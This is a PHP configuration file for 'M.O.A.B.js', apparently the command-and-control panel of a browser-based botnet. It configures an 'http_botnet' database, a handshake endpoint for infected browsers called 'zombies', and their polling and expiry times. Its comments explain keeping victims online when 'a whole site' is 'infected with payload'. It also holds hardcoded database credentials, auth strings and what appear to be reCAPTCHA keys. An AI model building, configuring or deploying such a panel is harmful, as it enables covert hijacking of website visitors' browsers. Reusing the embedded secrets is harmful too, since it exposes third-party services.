<?php
/*
Configuration
*/
/*****************************************************
/*****************************************************
##################### M.O.A.B.js #####################
################# Magic Of Ajax Bots #################
######### Do you want to see a magic trick? ##########
######################################################
                             _
                            | \
                           _|  \______________________________________
                          - ______        ________________          \_`,
                        -(_______            -=    -=        USAF       )
                                 `--------=============----------------`


				          /|,
				         / /,-/
				        .!//_/
				       / M |
				      /_O /
				     /:A`/
				    /'B`/
				    | ,'
				    '

		     _.-^^---....,,--       
		 _--                  --_  
		<                        >)
		|                         | 
		 \._                   _./  
		    ```--. . , ; .--'''       
		          | |   |             
		       .-=||  | |=-.   
		       `-=#$%&%$#=-'   
		          | ;  :|     
		 _____.,-#%&$@%#&#~,._____
******************************************************
*****************************************************/


/*****************************************************
################## MySQL Settings ####################
*****************************************************/
//MySQL Credentials
$mysql_host = "localhost";
$mysql_port = "3306";
$mysql_username = "root";
$mysql_password = "root";
$mysql_database = "http_botnet";


/*****************************************************
################### Site Settings ####################
############## General Website Settings ##############
*****************************************************/
//Site path
//If in root $sitepath = "";
$sitepath = "/moab"; //Using starting / but no trailing /

//Domain
$domain = "http://" . $_SERVER['HTTP_HOST'];

//Full handshake URL
$handshakeurl = "$domain$sitepath/handshake.php";

//Auth Strings
//Change to log all users out
$auth_string = "N[]Hw0@0v320!;07yn'7vMD #78%]7";
$auth_string2 = "^6836k!^2354%#@Y*2878p>U881'81";

//Recaptcha stuff
$publickey = "6Lcy9-MSAAAAAHz5Pg4GSS84OtgTl2XiD_-fxMCm";
$privatekey = "6Lcy9-MSAAAAANQLSt74I9Nb4lkf1d3BQi-Jec-Z";

//Site name
$sitename = "M.O.A.B.js";
$sitelink = "./index.php";

//Nav bar pages
$nav = array(
	"<span class='glyphicon glyphicon-home' aria-hidden='true'></span> Home" => "./index.php", 
	"<span class='glyphicon glyphicon-globe' aria-hidden='true'></span> Zombies" => "./zombies.php", 
	"<span class='glyphicon glyphicon-comment' aria-hidden='true'></span> Chat" => "./chat.php"
);

$loggedinmenu = array(
	"Edit Account" => "./editaccount.php",
	"divider" => "",
	"Sign Out" => "./ajax/login.php?logout"
);

//Contact information
$admin_email = "project@test.com"; //Email that emails will be sent from
//Additional contact information
$admin_contacts = array(
	"Email" => "plumlulz@gmail.com",
	"Jabber" => "plumm@jabber.org",
	"Twitter" => "@PlumLulz"
);


/*****************************************************
################## Zombie Settings ###################
########### Any settings regarding Zombies ###########
*****************************************************/
//How long Zombie IDs are
$zidlength = 32;
//How often zombies will check in and look for commands
$zombierefreshrate = "3000"; //In milliseconds

//How often the online zombies screen refreshes the current online zombies
$zombielistrefresh = "1500"; //In milliseconds

//How often zombie control page refreshes status of current zombie being controlled
$zombiecontrolrefresh = "3000"; //In milliseconds

//When to consider a zombie dead
//Zombies will be conisdered dead and will be turned offline when their last handshake exceeds value below in seconds
//Ex: If value is set to 10, zombies will be considered dead if the last handshake is 10 sec greater than  current time
//Value must not be less than $zombierefreshrate
//Value must be in seconds 
$zombieexpiretime = 10;

//If true Zombie sends request to go offline when it closes page or clicks another link
//If false Zombie will stay online upon page exit
//Zombie will go offline based on $zombieexpiretime if it doesn't land on another page with payload link
//Great for when you have a whole site infected with payload and users frequently page hop
$killuponexit = false;

?>